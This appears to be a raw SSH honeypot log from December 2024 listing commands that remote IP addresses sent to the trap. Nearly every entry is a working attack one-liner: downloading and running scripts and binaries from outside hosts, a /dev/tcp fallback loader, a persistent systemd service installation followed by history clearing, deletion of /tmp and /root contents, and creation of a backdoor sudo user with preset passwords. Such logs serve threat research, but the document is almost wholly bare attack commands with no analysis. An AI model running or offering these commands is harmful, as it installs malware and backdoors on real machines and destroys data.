start
2024-12-12 15:49:51.919109 - ('45.148.10.203', 52076) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 15:49:56.577272 - ('45.148.10.203', 52114) - apt
2024-12-12 15:49:56.851411 - ('45.148.10.203', 52114) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-12 16:58:30.203057 - ('117.103.147.186', 37876) - scp -t /tmp/LDOEudcK
2024-12-12 16:58:31.004724 - ('117.103.147.186', 37892) - scp -t /tmp/LDOEudcK
2024-12-12 22:05:38.511275 - ('87.120.113.231', 40094) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-12 22:22:31.790523 - ('46.19.143.66', 41454) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 pP6dQFac) system && sudo usermod -aG sudo system
2024-12-12 22:22:32.173421 - ('46.19.143.66', 41454) - lscpu && echo -e "pP6dQFac\npP6dQFac" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-13 00:20:04.743558 - ('45.148.10.203', 34282) - apt
2024-12-13 00:20:04.922050 - ('45.148.10.203', 34282) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:09.240698 - ('45.148.10.203', 37510) - apt
2024-12-13 00:20:09.421704 - ('45.148.10.203', 37510) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:13.731697 - ('45.148.10.203', 37514) - apt
2024-12-13 00:20:13.905118 - ('45.148.10.203', 37514) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:18.204635 - ('45.148.10.203', 54990) - apt
2024-12-13 00:20:18.381239 - ('45.148.10.203', 54990) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:22.693712 - ('45.148.10.203', 54992) - apt
2024-12-13 00:20:22.872762 - ('45.148.10.203', 54992) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:27.185199 - ('45.148.10.203', 47228) - apt
2024-12-13 00:20:27.361465 - ('45.148.10.203', 47228) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:31.684222 - ('45.148.10.203', 47242) - apt
2024-12-13 00:20:31.861470 - ('45.148.10.203', 47242) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 00:20:36.164524 - ('45.148.10.203', 47248) - apt
2024-12-13 00:20:36.345483 - ('45.148.10.203', 47248) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 06:56:17.345391 - ('185.225.200.154', 55686) - uname -a
2024-12-13 09:29:55.723283 - ('87.120.113.231', 45652) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-13 09:57:10.248207 - ('46.19.143.66', 36648) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 hvUDuybn) system && sudo usermod -aG sudo system
2024-12-13 09:57:10.685413 - ('46.19.143.66', 36648) - lscpu && echo -e "hvUDuybn\nhvUDuybn" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-13 11:16:57.885802 - ('45.148.10.203', 43934) - apt
2024-12-13 11:16:58.074936 - ('45.148.10.203', 43934) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 11:17:02.389753 - ('45.148.10.203', 43964) - apt
2024-12-13 11:17:02.562634 - ('45.148.10.203', 43964) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 11:17:06.892535 - ('45.148.10.203', 40014) - apt
2024-12-13 11:17:07.226943 - ('45.148.10.203', 40014) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 11:17:11.524678 - ('45.148.10.203', 40042) - apt
2024-12-13 11:17:11.703361 - ('45.148.10.203', 40042) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 12:54:14.410904 - ('37.44.238.68', 56746) - whoami
2024-12-13 12:54:16.645411 - ('37.44.238.68', 56768) - whoami
2024-12-13 12:54:19.625622 - ('37.44.238.68', 56776) - whoami
2024-12-13 12:54:22.136903 - ('37.44.238.68', 56754) - whoami
2024-12-13 12:54:24.270578 - ('37.44.238.68', 56758) - whoami
2024-12-13 12:54:26.599807 - ('37.44.238.68', 56798) - whoami
2024-12-13 12:54:29.064292 - ('37.44.238.68', 56788) - whoami
2024-12-13 12:54:31.336414 - ('37.44.238.68', 56810) - whoami
2024-12-13 12:54:33.482845 - ('37.44.238.68', 59924) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:35.652931 - ('37.44.238.68', 59940) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:37.943807 - ('37.44.238.68', 59944) - whoami
2024-12-13 12:54:40.329767 - ('37.44.238.68', 59948) - whoami
2024-12-13 12:54:42.386009 - ('37.44.238.68', 59950) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:45.236110 - ('37.44.238.68', 37542) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:48.058606 - ('37.44.238.68', 37552) - whoami
2024-12-13 12:54:50.961707 - ('37.44.238.68', 37562) - whoami
2024-12-13 12:54:52.422577 - ('37.44.238.68', 37566) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:55.355358 - ('37.44.238.68', 37568) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:54:57.189035 - ('37.44.238.68', 37570) - whoami
2024-12-13 12:54:58.898937 - ('37.44.238.68', 37572) - whoami
2024-12-13 12:55:00.891131 - ('37.44.238.68', 37582) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:03.667850 - ('37.44.238.68', 37596) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:05.172872 - ('37.44.238.68', 37610) - whoami
2024-12-13 12:55:06.664656 - ('37.44.238.68', 44866) - whoami
2024-12-13 12:55:08.483755 - ('37.44.238.68', 44876) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:10.446115 - ('37.44.238.68', 44880) - whoami
2024-12-13 12:55:12.306959 - ('37.44.238.68', 44892) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:15.297245 - ('37.44.238.68', 46350) - whoami
2024-12-13 12:55:17.924876 - ('37.44.238.68', 46356) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:20.051607 - ('37.44.238.68', 46368) - whoami
2024-12-13 12:55:21.719188 - ('37.44.238.68', 46376) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:23.882309 - ('37.44.238.68', 53722) - whoami
2024-12-13 12:55:25.526190 - ('37.44.238.68', 53738) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:27.507310 - ('37.44.238.68', 53754) - whoami
2024-12-13 12:55:29.582265 - ('37.44.238.68', 53756) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:32.275549 - ('37.44.238.68', 38490) - whoami
2024-12-13 12:55:34.218525 - ('37.44.238.68', 38504) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:36.310660 - ('37.44.238.68', 38514) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:38.464854 - ('37.44.238.68', 38530) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:40.744106 - ('37.44.238.68', 58604) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:43.582188 - ('37.44.238.68', 58614) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:46.053182 - ('37.44.238.68', 56742) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:48.416908 - ('37.44.238.68', 56850) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 12:55:50.580579 - ('37.44.238.68', 33982) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://37.44.238.68/bins.sh; curl -O http://37.44.238.68/bins.sh;/bin/busybox wget http://37.44.238.68/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-12-13 15:01:07.301533 - ('87.120.113.231', 41032) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-13 15:12:32.491508 - ('46.19.143.66', 59006) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ERqQS4cc) system && sudo usermod -aG sudo system
2024-12-13 15:12:32.792930 - ('46.19.143.66', 59006) - lscpu && echo -e "ERqQS4cc\nERqQS4cc" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-13 16:48:04.702425 - ('85.218.33.240', 46176) - wget -qO - http://61.215.136.198/x/1sh | sh > /dev/null 2>&1 &
2024-12-13 16:48:04.772782 - ('85.218.33.240', 46176) - rm -rf /var/run/1sh; wget -c http://61.215.136.198/x/1sh -P /var/run && sh /var/run/1sh &
2024-12-13 16:48:04.847890 - ('85.218.33.240', 46176) - wget -qO - http://61.215.136.198/x/2sh | sh > /dev/null 2>&1 &
2024-12-13 16:48:04.920832 - ('85.218.33.240', 46176) - rm -rf /tmp/2sh; wget -c http://61.215.136.198/x/2sh -P /tmp && sh /tmp/2sh &
2024-12-13 16:48:04.990864 - ('85.218.33.240', 46176) - curl http://61.215.136.198/x/3sh | sh
2024-12-13 16:48:05.059391 - ('85.218.33.240', 46176) - cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-13 16:48:05.127873 - ('85.218.33.240', 46176) - cd /tmp ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-13 16:48:05.196937 - ('85.218.33.240', 46176) - cd /dev/shm ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &
2024-12-13 16:48:05.270010 - ('85.218.33.240', 46176) - uname -a || cat /proc/version || echo -- 
2024-12-13 21:45:29.882827 - ('87.120.113.231', 37002) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-13 22:26:27.580779 - ('45.148.10.203', 51574) - apt
2024-12-13 22:26:27.760820 - ('45.148.10.203', 51574) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-13 23:01:20.261993 - ('87.120.113.231', 35724) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-13 23:30:44.186982 - ('87.120.113.231', 56492) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-14 01:56:36.198165 - ('46.19.143.66', 41084) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 tQRhDbkS) system && sudo usermod -aG sudo system
2024-12-14 01:56:36.428667 - ('46.19.143.66', 41084) - lscpu && echo -e "tQRhDbkS\ntQRhDbkS" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-12-14 03:55:05.946948 - ('218.92.0.132', 49678) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-12-14 03:55:07.075707 - ('218.92.0.132', 49678) - ls -la /var/run/gcc.pid
2024-12-14 04:10:00.806182 - ('45.148.10.203', 54494) - apt
2024-12-14 04:10:00.984217 - ('45.148.10.203', 54494) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-14 06:46:14.741782 - ('94.19.104.188', 60446) - scp -t /tmp/VqBk8HFt
2024-12-14 06:46:15.038688 - ('94.19.104.188', 60454) - scp -t /tmp/VqBk8HFt
